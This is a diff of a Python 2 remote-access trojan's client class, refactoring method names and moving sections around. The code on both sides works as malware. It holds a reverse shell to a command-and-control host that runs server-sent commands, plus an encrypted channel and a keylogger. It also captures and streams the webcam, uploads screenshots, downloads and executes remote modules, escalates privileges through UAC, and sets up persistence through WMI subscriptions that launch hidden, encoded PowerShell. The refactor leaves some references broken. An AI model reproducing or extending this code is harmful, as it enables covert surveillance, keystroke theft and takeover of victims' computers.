@@ -89,7 +89,6 @@ class Client(object):
         self.mode       = 0
         self.exit       = 0
         self.jobs       = {}
-        self.commands   = {}
         self.buffer     = str()
         self.window     = None
         self.a          = long(kwargs.get('a'))
@@ -107,22 +106,19 @@ class Client(object):
         self.modules    = self.get_modules()
         self.results    = self.get_results()
 
-# ----------------- Internal Functions --------------------------
-    @staticmethod
-    def cmd(function):
-        return self.commands.update({function.func_name: function})
+# ----------------- PRIVATE FUNCTIONS --------------------------
 
-    def pad(self, s):
+    def _pad(self, s):
         return s + (AES.block_size - len(bytes(s)) % AES.block_size) * b'\0'
 
-    def hidden_process(self, path):
+    def _hidden_process(self, path):
         info = subprocess.STARTUPINFO()
         info.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
         info.wShowWindow = subprocess.SW_HIDE
         p = subprocess.Popen(path, startupinfo=info)
         return p
 
-    def target(self, **kwargs):
+    def _target(self, **kwargs):
         try:
             ab = request('GET', long_to_bytes(self.a), headers={'API-Key': long_to_bytes(self.b)}).json() 
             return ab[ab.keys()[0]][0].get('ip')
@@ -130,7 +126,7 @@ class Client(object):
             if self.v:
                 print 'Target error: {}'.format(str(e))
     
-    def connect(self, host='localhost', port=1337):
+    def _connect(self, host='localhost', port=1337):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             print 'Connecting to {}:{}...'.format(host, port)
@@ -140,24 +136,24 @@ class Client(object):
             if self.v:
                 print 'Connection error: {}'.format(str(e))
             time.sleep(10)
-            return self.connect(host, port)
+            return self._connect(host, port)
 
-    def send(self, data, method='default'):
+    def _send(self, data, method='default'):
         try:
             block = data[:4096]
             data  = data[len(block):]
-            ciphertext  = self.encrypt(block)
+            ciphertext  = self._encrypt(block)
             msg = '{}:{}\n'.format(method, ciphertext)
             try:
                 self.socket.sendall(msg)
             except socket.error: return
             if len(data):
-                return self.send(data, method)
+                return self._send(data, method)
         except Exception as e:
             if self.v:
                 print 'Send error: {}'.format(str(e))
 
-    def receive(self):
+    def _receive(self):
         try:
             data = ""
             self.socket.setblocking(False) if self.mode else self.socket.setblocking(True)
@@ -165,13 +161,13 @@ class Client(object):
                 try:
                     data += self.socket.recv(1024)
                 except socket.error: return
-            data = self.decrypt(data.rstrip()) if len(data) else data
+            data = self._decrypt(data.rstrip()) if len(data) else data
             return data
         except Exception as e:
             if self.v:
                 print 'Receive error: {}'.format(str(e))
 
-    def diffiehellman(self, bits=2048):
+    def _diffiehellman(self, bits=2048):
         try:
             p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             g = 2
@@ -185,9 +181,9 @@ class Client(object):
             if self.v:
                 print 'Diffie-Hellman error: {}'.format(str(e))
 
-    def encrypt(self, plaintext):
+    def _encrypt(self, plaintext):
         try:
-            text = self.pad(bytes(plaintext))
+            text = self._pad(bytes(plaintext))
             iv = os.urandom(AES.block_size)
             cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
             ciphertext = iv + cipher.encrypt(text)
@@ -198,7 +194,7 @@ class Client(object):
             if self.v:
                 print 'Error: {}'.format(str(e))
 
-    def decrypt(self, ciphertext):
+    def _decrypt(self, ciphertext):
         try:
             ciphertext  = b64decode(ciphertext)
             iv          = ciphertext[:AES.block_size]
@@ -213,7 +209,7 @@ class Client(object):
             if self.v:
                 print 'Decryption error: {}'.format(str(e))
 
-    def obfuscate(self, data, encoding=None):
+    def _obfuscate(self, data, encoding=None):
         data    = bytes(data)
         p       = []
         n       = len(data)
@@ -233,7 +229,7 @@ class Client(object):
                 else:
                     return b64encode(block)
 
-    def deobfuscate(block, encoding=None):
+    def _deobfuscate(block, encoding=None):
         p = []
         block = b64decode(block)
         for i in xrange(2, len(block)):
@@ -246,7 +242,7 @@ class Client(object):
                 p.append(i)
         return str().join([block[i] for i in p])
 
-    def pprint(self, dict_or_json):
+    def _show(self, dict_or_json):
         try:
             results = json.dumps(dict_or_json, indent=2, separators=(',','\t'))
         except Exception as e:
@@ -260,7 +256,7 @@ class Client(object):
                 results = repr(dict_or_json)
         return results
 
-    def execute_powershell(self, cmdline):
+    def _powershell(self, cmdline):
         try:
             info = subprocess.STARTUPINFO()
             info.dwFlags = sub.STARTF_USESHOWWINDOW
@@ -272,146 +268,7 @@ class Client(object):
         except Exception as e:
             if self.v:
                 print 'Powershell error: {}'.format(str(e))
-
-    def get_results(self):
-        return {module:{} for module in self.modules}
-
-    def get_modules(self):
-        return {
-            'webcam'        : {'status': True, 'options': {'image': True, 'video': False, 'stream': False}},
-            'keylogger'     : {'status': True, 'options': {'bytes': 1024, 'seconds': 300.0}},
-            'screenshot'    : {'status': True, 'options': {}},
-            'persistence'   : {'status': True, 'options': {'method': 'all'}}
-            }
-
-    @cmd
-    def pwd(self,**kwargs): return os.getcwd()
-    @cmd
-    def new(self, options): return get_module(uri)
-    @cmd
-    def wget(self, target): return urlretrieve(target)[0]
-    @cmd
-    def cat(self,filename): return open(filename).read(4000)
-    @cmd
-    def selfdestruct(self): return self.self_destruct()
-    @cmd
-    def ls(self, pathname): return '\n'.join(os.listdir(dirname))
-    @cmd
-    def unzip(self, files): return ZipFile(path).extractall('.')
-    @cmd
-    def cd(self, pathname): return os.chdir(dirname) if os.path.isdir(dirname) else os.chdir('.')
-    @cmd
-    def show(self, target): return self.pprint(getattr(self, x)) if hasattr(self, x) else '{} not found'.format(x)
-    @cmd
-    def use(self, modules): return self.modules.get(module).update({'status': True}) if module in self.modules else None
-    @cmd
-    def stop(self, target): return [self.modules.get(module).update({'status': False}) for module in tasks if module in self.modules]
-    @cmd
-    def info(self, **args): return {'IP Address': self.get_ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
-    @cmd
-    def status(self,*args): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
-
-    def get_ip(self):
-        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
-        for target in sources:
-            try:
-                ip = request('GET', target).content
-                if socket.inet_aton(ip):
-                    return ip
-            except: pass
-
-    def get_mode(self, args=None):
-        if args:
-            mode, _, p = str(args).partition(' ')
-            if mode == 'standby':
-                self.mode = 1
-                port = int(p) if len(p) else 4321
-                self.logger = self.get_logger(port)
-            else:
-                self.mode = 0
-        output = 'standing by' if self.mode else 'client ready'
-        return output
-
-    def get_admin(self):
-        if self.info['Admin']:
-            return {'User': self.login, 'Administrator' : str(self.admin)}
-        if self.f:
-            if os.name is 'nt':
-                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.f))
-            else:
-                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
-
-    def get_logger(self, port=4321):
-        module_logger           = getLogger(self.info.get('IP Address'))
-        module_logger.handlers  = []
-        socket_handler          = SocketHandler(self.target(o=self.a, p=self.b), port)
-        module_logger.addHandler(socket_handler)
-        return module_logger
-
-    def get_module(self, uri, name=None):
-        name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
-        module  = new_module(name)
-        source  = request('GET', uri).content
-        code    = compile(source, name, 'exec')
-        exec code in module.__dict__
-        globals()[name] = module
-        sys.modules[name] = module
-        return module
-
-    def run_modules(self):
-        modules = [mod.lower() for mod in self.modules if self.modules[mod].get('status')]
-        for module in modules:
-            self.jobs[module] = Thread(target=getattr(self, module), name=module.title())
-            self.jobs[module].start()
-        t.join()
-        if not self.mode:
-            return self.pprint(self.results)
-
-    def run_shell(self):
-        while True:
-            if self.mode:
-                break
-            prompt = "[%d @ {}]> ".format(os.getcwd())
-            self.send(prompt, method='prompt')   
-            data = self.receive()
-            cmd, _, action = data.partition(' ')
-
-            if cmd in self.commands:
-                result = self.commands[cmd](action) if len(action) else self.commands[cmd]()
-            else:
-                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-
-            if result and len(result):
-                result = '\n' + str(result) + '\n'
-                self.send(result, method=cmd)
-
-    def run_standby(self):
-        while True:
-            runs = time.time() + 60.0
-            while time.time() < runs:
-                time.sleep(1)
-                if self.mode:
-                    b = self.receive()
-                    if b and len(b):
-                        self.mode = 0 if b else 1
-                else:
-                    break
-            data = self.run_modules()
-
-    def run(self):
-        self.socket = self.connect(host=self.target(o=self.a, p=self.b))
-        self.dhkey  = self.diffiehellman()
-        exit_status = 0
-        if self.v:
-            print 'connected successfully'
-        while not exit_status:
-            if not self.mode:
-                self.run_shell()
-            else:
-                self.run_standby()
-            exit_status = self.exit
-        sys.exit(0)
-
+        
 # ----------------- KEYLOGGER --------------------------
 
     def keylogger_event(self, event):
@@ -466,6 +323,43 @@ class Client(object):
                     PumpMessages()
                 else:
                     time.sleep(0.1)
+
+# ----------------- WEBCAM --------------------------
+
+    def webcam_image(self):
+        dev = VideoCapture(0)
+        tmp = mktemp(suffix='.png') if os.name is 'nt' else mktemp(prefix='.', suffix='.png')
+        r,f = dev.read()
+        waitKey(1)
+        imwrite(tmp, f)
+        dev.release()
+        self.results['webcam'][time.ctime()] = self.upload_imgur(tmp)
+
+    def webcam_stream(self):
+        dev = VideoCapture(0)
+        s   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((self._target(o=self.a, p=self.b), port))
+        while True:
+            ret, frame = dev.read()
+            data = pickle.dumps(frame)
+            try:
+                self._send(pack("L", len(data))+data)
+            except:
+                dev.release()
+                break
+
+    def webcam_video(self):
+        fpath   = mktemp(suffix='.avi')
+        fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
+        output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
+        dev     = VideoCapture(0)
+        end     = time.time() + 5.0
+        while True:
+            ret, frame = dev.read()
+            output.write(frame)
+            if waitKey(0) and time.time() > end: break
+        dev.release()
+        self.results['webcam'][time.ctime()] = self.upload_ftp(fpath)
 
 # ----------------- PERSISTENCE --------------------------
 
@@ -549,9 +443,9 @@ class Client(object):
                 cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
             startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
             powershell = request('GET', long_to_bytes(self.s)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
-            self.execute_powershell(powershell)
+            self._powershell(powershell)
             code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
-            result = self.execute_powershell(code)
+            result = self._powershell(code)
             if name in result:
                 return True
         except Exception as e:
@@ -565,7 +459,7 @@ class Client(object):
             Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
             Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
             Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
-            result = self.execute_powershell(code)
+            result = self._powershell(code)
             if not result:
                 return True
         except: pass
@@ -614,44 +508,134 @@ class Client(object):
         except: pass
         return False
 
-# ----------------- WEBCAM --------------------------
+# ----------------- COMMANDS --------------------------
 
-    def webcam_image(self):
-        dev = VideoCapture(0)
-        tmp = mktemp(suffix='.png') if os.name is 'nt' else mktemp(prefix='.', suffix='.png')
-        r,f = dev.read()
-        waitKey(1)
-        imwrite(tmp, f)
-        dev.release()
-        self.results['webcam'][time.ctime()] = self.upload_imgur(tmp)
+    def pwd(self,**kwargs): return os.getcwd()
+    
+    def new(self, options): return get_module(uri)
+    
+    def wget(self, target): return urlretrieve(target)[0]
+    
+    def cat(self,filename): return open(filename).read(4000)
+    
+    def selfdestruct(self): return self.self_destruct()
+    
+    def ls(self, pathname): return '\n'.join(os.listdir(dirname))
+    
+    def unzip(self, files): return ZipFile(path).extractall('.')
+    
+    def cd(self, pathname): return os.chdir(dirname) if os.path.isdir(dirname) else os.chdir('.')
+    
+    def show(self, target): return self._show(getattr(self, x)) if hasattr(self, x) else '{} not found'.format(x)
+    
+    def use(self, modules): return self.modules.get(module).update({'status': True}) if module in self.modules else None
+    
+    def stop(self, target): return [self.modules.get(module).update({'status': False}) for module in tasks if module in self.modules]
+    
+    def info(self, **args): return {'IP Address': self.get_ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
+    
+    def status(self,*args): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
 
-    def webcam_stream(self):
-        dev = VideoCapture(0)
-        s   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self.target(o=self.a, p=self.b), port))
-        while True:
-            ret, frame = dev.read()
-            data = pickle.dumps(frame)
+# ----------------- MODULES --------------------------
+
+    def persistence(self):
+        persistence_methods = ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']
+        for method in persistence_methods:
+            if self.modules['persistence']['status']:
+                if method not in self.results['persistence']:
+                    self.results['persistence'][method] = getattr(self, 'add_{}_{}_persistence'.format(*method.split()))()
+            else:
+                if method in self.results['persistence']:
+                    self.results['persistence'].remove(method) if getattr(self, 'remove_{}_{}_persistence'.format(*method.split()))() else None
+
+    def screenshot(self):
+        if self.modules['screenshot']['status']:
+            tmp = mktemp(suffix='.png')
+            with mss() as screen:
+                img = screen.shot(output=tmp)
+            self.results['screenshot'][time.ctime()] = self.upload_imgur(img)
+
+    def keylogger(self):
+        if self.modules['keylogger'].get('status'):
+            if 'keylogger' in self.jobs:
+                if not self.jobs['keylogger'].is_alive():
+                    self.jobs['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
+                    self.jobs['keylogger'].start()
+            else:
+                self.jobs['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
+                self.jobs['keylogger'].start()
+            runtime = time.time() - float(self.jobs['keylogger'].name)
+            status  = 'Current session duration: {}'.format(self.get_status(runtime))
+            self.results['keylogger'][time.ctime()] = status
+            return status
+
+    def webcam(self):
+        if self.modules['webcam']['options']['image']:
+            return self.webcam_image()
+        elif self.modules['webcam']['options']['stream']:
+            return self.webcam_stream()
+        elif self.modules['webcam']['options']['video']:
+            return self.webcam_video()
+
+# ----------------- PUBLIC FUNCTIONS --------------------------
+
+    def get_results(self):
+        return {module:{} for module in self.modules}
+
+    def get_modules(self):
+        return {
+            'webcam'        : {'status': True, 'options': {'image': True, 'video': False, 'stream': False}},
+            'keylogger'     : {'status': True, 'options': {'bytes': 1024, 'seconds': 300.0}},
+            'screenshot'    : {'status': True, 'options': {}},
+            'persistence'   : {'status': True, 'options': {'method': 'all'}}
+            }
+
+    def get_ip(self):
+        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
+        for target in sources:
             try:
-                self.send(pack("L", len(data))+data)
-            except:
-                dev.release()
-                break
+                ip = request('GET', target).content
+                if socket.inet_aton(ip):
+                    return ip
+            except: pass
 
-    def webcam_video(self):
-        fpath   = mktemp(suffix='.avi')
-        fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
-        output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
-        dev     = VideoCapture(0)
-        end     = time.time() + 5.0
-        while True:
-            ret, frame = dev.read()
-            output.write(frame)
-            if waitKey(0) and time.time() > end: break
-        dev.release()
-        self.results['webcam'][time.ctime()] = self.upload_ftp(fpath)
+    def get_mode(self, args=None):
+        if args:
+            mode, _, p = str(args).partition(' ')
+            if mode == 'standby':
+                self.mode = 1
+                port = int(p) if len(p) else 4321
+                self.logger = self.get_logger(port)
+            else:
+                self.mode = 0
+        output = 'standing by' if self.mode else 'client ready'
+        return output
 
-# ----------------- UPLOADERS --------------------------
+    def get_admin(self):
+        if self.info['Admin']:
+            return {'User': self.login, 'Administrator' : str(self.admin)}
+        if self.f:
+            if os.name is 'nt':
+                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.f))
+            else:
+                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
+
+    def get_logger(self, port=4321):
+        module_logger           = getLogger(self.info.get('IP Address'))
+        module_logger.handlers  = []
+        socket_handler          = SocketHandler(self._target(o=self.a, p=self.b), port)
+        module_logger.addHandler(socket_handler)
+        return module_logger
+
+    def get_module(self, uri, name=None):
+        name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
+        module  = new_module(name)
+        source  = request('GET', uri).content
+        code    = compile(source, name, 'exec')
+        exec code in module.__dict__
+        globals()[name] = module
+        sys.modules[name] = module
+        return module
 
     def upload_imgur(self, filename):
         with open(filename, 'rb') as fp:
@@ -675,48 +659,61 @@ class Client(object):
             result = str(e)
         return result
 
-# ----------------- MODULES --------------------------
+    def run_modules(self):
+        modules = [mod.lower() for mod in self.modules if self.modules[mod].get('status')]
+        for module in modules:
+            self.jobs[module] = Thread(target=getattr(self, module), name=module.title())
+            self.jobs[module].start()
+        t.join()
+        if not self.mode:
+            return self._show(self.results)
 
-    def screenshot(self):
-        if self.modules['screenshot']['status']:
-            tmp = mktemp(suffix='.png')
-            with mss() as screen:
-                img = screen.shot(output=tmp)
-            self.results['screenshot'][time.ctime()] = self.upload_imgur(img)
+    def run_shell(self):
+        while True:
+            if self.mode:
+                break
+            prompt = "[%d @ {}]> ".format(os.getcwd())
+            self._send(prompt, method='prompt')   
+            data = self._receive()
+            cmd, _, action = data.partition(' ')
 
-    def webcam(self):
-        if self.modules['webcam']['options']['image']:
-            return self.webcam_image()
-        elif self.modules['webcam']['options']['stream']:
-            return self.webcam_stream()
-        elif self.modules['webcam']['options']['video']:
-            return  self.webcam_video()
-            
-    def keylogger(self):
-        if self.modules['keylogger'].get('status'):
-            if 'keylogger' in self.jobs:
-                if not self.jobs['keylogger'].is_alive():
-                    self.jobs['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
-                    self.jobs['keylogger'].start()
+            if cmd in self.commands:
+                result = self.commands[cmd](action) if len(action) else self.commands[cmd]()
             else:
-                self.jobs['keylogger'] = Thread(target=self.keylogger_manager, name=time.time())
-                self.jobs['keylogger'].start()
-            runtime = time.time() - float(self.jobs['keylogger'].name)
-            status  = 'Current session duration: {}'.format(self.get_status(runtime))
-            self.results['keylogger'][time.ctime()] = status
-            return status
+                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
 
-    def persistence(self):
-        persistence_methods = ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']
-        for method in persistence_methods:
-            if self.modules['persistence']['status']:
-                if method not in self.results['persistence']:
-                    self.results['persistence'][method] = getattr(self, 'add_{}_{}_persistence'.format(*method.split()))()
+            if result and len(result):
+                result = '\n' + str(result) + '\n'
+                self._send(result, method=cmd)
+
+    def run_standby(self):
+        while True:
+            runs = time.time() + 60.0
+            while time.time() < runs:
+                time.sleep(1)
+                if self.mode:
+                    b = self._receive()
+                    if b and len(b):
+                        self.mode = 0 if b else 1
+                else:
+                    break
+            data = self.run_modules()
+
+    def run(self):
+        self.socket = self._connect(host=self._target(o=self.a, p=self.b))
+        self.dhkey  = self._diffiehellman()
+        exit_status = 0
+        if self.v:
+            print 'connected successfully'
+        while not exit_status:
+            if not self.mode:
+                self.run_shell()
             else:
-                if method in self.results['persistence']:
-                    self.results['persistence'].remove(method) if getattr(self, 'remove_{}_{}_persistence'.format(*method.split()))() else None
+                self.run_standby()
+            exit_status = self.exit
+        sys.exit(0)
 
-
+# ----------------- MAIN --------------------------
 
 def main(*args, **kwargs):
     module = Client(**kwargs)
